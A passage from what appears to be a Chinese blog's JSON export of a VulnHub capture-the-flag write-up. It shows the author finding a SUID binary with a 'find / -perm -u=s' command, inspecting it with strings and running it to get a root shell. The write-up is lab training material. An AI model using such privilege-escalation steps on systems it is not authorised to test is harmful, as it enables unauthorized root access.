分析文件</h3>\n<p>拿到服务器后，搜索到了一个 s 权限的奇怪文件<br>\n find /-perm -u=s -type f 2&gt;/dev/null<br>\n<img data-src=\"/N1h1l157/VULNHUB/image-1118.png\" alt></p>\n<p>用 strings 检查了一下并没有发现封装什么特殊的命令，可能是作者自己封装<br>\n的一个命令，没有头绪怎么处理这个文件<br>\n<img data-src=\"/N1h1l157/VULNHUB/image-1119.png\" alt></p>\n<p>既然是可执行文件，就去执行，拿到了 root 的 shell<br>\n<img data-src=\"/N1h1l157/VULNHUB/image-1120.png\" alt></p>\n",
            "tags": [
                "VULNHUB 31-40"
            ]
        }
    ]
}